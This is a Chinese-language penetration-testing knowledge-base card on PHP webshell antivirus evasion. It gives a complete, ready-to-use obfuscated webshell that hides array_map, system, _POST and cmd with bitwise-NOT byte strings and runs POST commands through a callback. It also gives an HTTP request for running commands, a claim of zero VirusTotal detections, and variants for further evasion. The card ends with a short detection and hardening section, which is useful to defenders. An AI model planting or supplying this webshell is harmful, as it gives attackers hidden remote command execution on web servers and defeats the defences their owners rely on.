---
id: web-php-rce-webshell-string-not-dynamic-call-av-bypass
title: PHP WebShell 免杀：字符串按位取反 + 可变变量 + array_map 动态调用
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-string-obfuscation-av-bypass
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- php
- webshell
- av-bypass
- obfuscation
- string-obfuscation
- dynamic-call
- file-upload
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:46:32+08:00'
  notes: 已对照原文与图 01-03 核对：array_map/system/_POST/cmd 按位取反分段拼接、全下划线变量、可变变量动态取 POST 参数、最终 array_map('system',[...]) 执行；VT 0/61 与火绒自定义查杀无风险截图一致；PoC 未在本机执行，且卡内已注明仅规避静态检测。
url: /docs/web/php/rce/web-php-rce-webshell-string-not-dynamic-call-av-bypass/
draft: false
kb_aliases:
- PHP WebShell 字符串运算免杀
- 取反免杀
- 字符串按位取反 webshell
- array_map 动态调用免杀
- 可变变量 webshell
- 火绒免杀 PHP 马
---

## 一句话结论

把 `array_map`、`system`、`_POST`、`cmd` 等敏感标识符用按位取反 `~` 转成不可打印字节、分段拼接后写入文件，运行时再取反还原，并用可变变量与 `array_map` 回调完成动态调用，可以让静态文件扫描看不到任何明文敏感关键字，从而绕过基于特征的一句话查杀。

## 原理

- 杀软对 PHP WebShell 的静态检测主要依赖：明文关键字（`eval`、`assert`、`system`、`$_POST`、`cmd`）与结构特征（如 `@eval($_GET["code"])`）。只要文件中不出现这些字节序列，静态规则就难以命中。
- PHP 的 `~` 运算符作用于字符串时，对每个字节做按位取反：`"a"`（0x61）→ `0x9E`，`"r"`（0x72）→ `0x8D`。因此 `array_map` 可以表示成 `"\x9E\x8D\x8D\x9E\x86\xA0\x92\x9E\x8F"`，文件中只有十六进制转义，没有可读关键字。
- 进一步把取反后的字节串拆成多段用 `.` 连接（如 `"\x9E\x8D\x8D" . "\x9E\x86\xA0" . "\x92\x9E\x8F"`），破坏连续特征，降低正则/YARA 一类规则命中率。
- 运行时 `~$str` 在内存中还原出 `array_map`；变量名全部使用 `_`、`__`、`___`、`____`，避免出现有意义的命名特征。
- **动态调用**：`$___` 还原为 `"_POST"`，`${$___}` 是可变变量语法，等价于 `$_POST`；`$____` 还原为 `"cmd"`，于是 `${$___}[$____]` 即 `$_POST['cmd']`。最终 `$_($__, [${$___}[$____]])` 即 `array_map("system", [$_POST['cmd']])`，`system` 作为回调执行命令并回显。
- 该手法只规避静态内容检测；运行时 `system()` 派生子进程的行为仍可能被 EDR/主机防护捕获，因此文中称“静态过了，动态大概率会过”，取决于防护强度。

## 触发条件

- 目标 PHP 环境允许 `array_map` 与 `system`（或可替换为 `exec`、`shell_exec`、`passthru` 等回调）；
- 文件能落地并被 Web 访问（上传、文件写入、日志包含等）；
- 防护以静态文件内容/关键字检测为主；若存在强运行时行为检测，仍需进一步规避。

## 利用步骤

1. 确定最终要执行的函数与参数来源，例如 `array_map('system', [$_POST['cmd']])`。
2. 对每个敏感字符串做按位取反，得到十六进制字节序列。
3. 将字节序列拆成多段，用 `.` 拼接，赋值给 `_` 命名的变量。
4. 用可变变量还原 `_POST` 与 `cmd`，通过 `array_map` 回调执行。
5. 保存为 `.php` 落地；静态查杀通过后，用 POST `cmd=whoami` 验证回显。
6. 需要更强隐蔽性时，叠加 RSA 流量加密编码器（见独立卡片）。

## PoC

按位取反计算：`~"\x9E\x8D\x8D\x9E\x86\xA0\x92\x9E\x8F"` 得到 `array_map`。

完整 Payload：

```php
<?php
$_ = ~(
    "\x9E\x8D\x8D" .
    "\x9E\x86\xA0" .
    "\x92\x9E\x8F"
);                       // array_map

$__ = ~(
    "\x8C\x86\x8C" .
    "\x8B\x9A\x92"
);                       // system

$___ = ~(
    "\xA0" .
    "\xAF\xB0" .
    "\xAC\xAB"
);                       // _POST

$____ = ~(
    "\x9C" .
    "\x92\x9B"
);                       // cmd

$_($__, [${$___}[$____]]);
```

请求：

```http
POST /shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cmd=whoami
```

文件中不含 `array_map`、`system`、`$_POST`、`cmd` 等明文；原文实测该文件在 VirusTotal 上 0/61 检出，火绒自定义查杀也未发现风险。

## 变体与关联

- 相同思路可用异或 `^`、自增 `++`、字符串转义、Base64/十六进制解码等构造关键字；本卡只覆盖按位取反。
- 回调可替换：`array_map` → `call_user_func_array`、`preg_replace_callback`、`uasort` 等；执行函数可替换为 `exec`、`passthru`、`shell_exec` 等。
- 流量层可叠加 RSA 加密编码器（见独立卡片），同时规避请求体关键字检测。
- 若目标禁用 `system`，需结合 `disable_functions` 绕过或改用其他可执行原语。

## 检测与防御

- 静态检测不能只匹配明文关键字：应对文件做解码/脱混淆预处理（还原 `\xNN`、`~`、`^`、`base64_decode` 等），或使用 AST/行为特征检测；关注大量 `\xNN` 转义、`~(` 组合、全下划线变量名等可疑结构。
- 运行时检测更可靠：监控 PHP 进程通过 `system`/`exec`/`shell_exec`/`passthru`/`proc_open` 派生子进程，尤其是 Web 进程启动 shell；用 EDR/eBPF 捕获 `execve` 链。
- 禁用危险函数（`system`、`exec`、`shell_exec`、`passthru`、`proc_open`、`array_map` 必要时）并配合 `disable_functions` 的其他加固；限制上传目录执行权限（`noexec`/PHP 不解析）。
- WAF 对 `\x9E` 一类不可打印字节转义、`${$` 可变变量、`array_map` 回调组合增加规则；对请求参数中的命令关键字做归一化检测。
- 定期扫描 Web 目录新增/变更的 PHP 文件，审计文件内容编码异常。
